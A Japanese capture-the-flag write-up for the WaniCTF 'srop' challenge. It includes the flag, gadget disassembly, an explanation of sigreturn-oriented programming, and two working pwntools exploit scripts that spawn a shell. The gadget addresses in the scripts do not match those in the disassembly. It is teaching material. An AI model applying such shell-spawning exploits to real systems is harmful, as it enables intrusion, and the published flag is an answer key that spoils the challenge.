# srop

## 問題文

```
nc srop.pwn.wanictf.org 9006
```

+ sigreturnを用いたROPでシェルを実行してください。
+ sigreturnを使うとスタックの値でレジスタを書き換えることができます。

### ヒント

+ https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/sigcontext.h#L325
+ https://docs.pwntools.com/en/latest/rop/srop.html


## FLAG

`FLAG{0v3rwr173_r361573r5_45_y0u_l1k3}`

## 解法

Sigreturnが呼ばれるとスタックのある領域の値がレジスターに入ります。
コードで必要なgadgetは与えられています。これをどう組むかが問題です。
先ずは必要なgadgetの位置から確認しましょう。

```
0000000000401156 <call_syscall>:
  401156:       f3 0f 1e fa             endbr64
  40115a:       55                      push   rbp
  40115b:       48 89 e5                mov    rbp,rsp
  40115e:       0f 05                   syscall
  401160:       c3                      ret
  401161:       90                      nop
  401162:       5d                      pop    rbp
  401163:       c3                      ret

0000000000401164 <set_rax>:
  401164:       f3 0f 1e fa             endbr64
  401168:       55                      push   rbp
  401169:       48 89 e5                mov    rbp,rsp
  40116c:       48 c7 c0 0f 00 00 00    mov    rax,0xf
  401173:       c3                      ret
  401174:       90                      nop
  401175:       5d                      pop    rbp
  401176:       c3                      ret

```

0x40115e -> sycall; ret;
0x40116c -> mov rax,0xf; ret;

順番は以下のようになります。
1. スタックに最終的にはシェルが実行できるように値を入れる。
2. main関数のreturnを040116cにする。ー＞raxが15になる。
3. その次に0x40115eにretさせる。 ー＞sigreturnが呼ばれる。　ー＞シェルが実行できるようにレジスターの値を上書きされる。
4. シェルが実行される。

シェルを実行するためにはraxを58(0x3b)にしてrdiに"/bin/sh"が書かれているアドレスを与えて必要ない部分は0にした状態でのsyscallが必要です。
レジスターを上書きするとき、ripをsyscallにすることで簡単にできます。

実行したらbuffの位置が表示されるのでそこに"/bin/sh"を入れてそのアドレスを使えばrdiは解決です。
次にreturnの値を書き換えてmainが終わったらraxを15にしてsyscallするようにします。
そこからそのsigreturnでスタックのどこからがレジスターに入るかを確認してレジスターに書きたい値の入力位置とあわせます。

あとはsigcontextの構造に合わせて必要な値を並べるだけです。
buffの最初に"/bin/sh\00"を入れて
buffの値は最初から出力されるようにしたので、そのまま使いましょう。

この部分はpwntoolsのSigreturnFrameを使う方法もあります。
https://docs.pwntools.com/en/latest/rop/srop.html

Solution 1 : w/o pwntools SigreturnFrame
```
from pwn import *

set_rax = p64(0x40118c)
syscall = p64(0x40117e)

#pc = process("./chall")
pc = connect('localhost',9101)
buff=pc.recvuntil('\n')[7:-1]
buff=int(buff,16)
print('@buff : '+hex(buff))


payload = b"/bin/sh\x00"
payload+= b'A'*64
payload+=set_rax
payload+=syscall

payload+=p64(0)*5 #user_context

payload+=p64(0)*8 #r8~r15
payload+=p64(buff)#rdi
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0x3b)#rax
payload+=p64(0)
payload+=p64(0)
payload+=syscall #eip
payload+=p64(0) #eflags
payload+=p64(0x33) #cs
payload+=p64(0) #gs
payload+=p64(0) #fs
payload+=p64(0) #ss
payload+=p64(0)*7

print(pc.recvuntil('\n'))
pc.send(payload)
pc.interactive()
```

Solution 2 : w pwntools SigreturnFrame
```
from pwn import *

set_rax = p64(0x40118c)
syscall = p64(0x40117e)

#pc = process("./chall")
pc = connect('localhost',9101)
buff=pc.recvuntil('\n')[7:-1]
buff=int(buff,16)
print('@buff : '+hex(buff))

frame=SigreturnFrame(arch="amd64")
frame.rax=0x3b
frame.rdi=buff
frame.rip=u64(syscall)

payload = b"/bin/sh\x00"
payload+= b'A'*64
payload+=set_rax
payload+=syscall
payload+=bytes(frame) #str(frame) for python2

print(pc.recvuntil('\n'))
#gdb.attach(pc,gdbscript="break *0x4011a3")
pc.send(payload)
pc.interactive()
```
